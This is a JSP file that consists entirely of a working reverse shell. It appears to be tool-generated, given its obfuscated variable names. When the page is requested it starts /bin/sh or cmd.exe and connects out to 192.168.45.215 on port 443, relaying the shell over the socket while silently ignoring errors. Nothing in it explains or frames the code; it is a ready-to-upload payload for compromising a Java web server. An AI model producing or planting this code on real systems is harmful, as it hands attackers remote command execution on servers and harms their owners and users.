<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream y8;
    OutputStream vK;

    StreamConnector( InputStream y8, OutputStream vK )
    {
      this.y8 = y8;
      this.vK = vK;
    }

    public void run()
    {
      BufferedReader q5  = null;
      BufferedWriter gaB = null;
      try
      {
        q5  = new BufferedReader( new InputStreamReader( this.y8 ) );
        gaB = new BufferedWriter( new OutputStreamWriter( this.vK ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = q5.read( buffer, 0, buffer.length ) ) > 0 )
        {
          gaB.write( buffer, 0, length );
          gaB.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( q5 != null )
          q5.close();
        if( gaB != null )
          gaB.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "192.168.45.215", 443 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
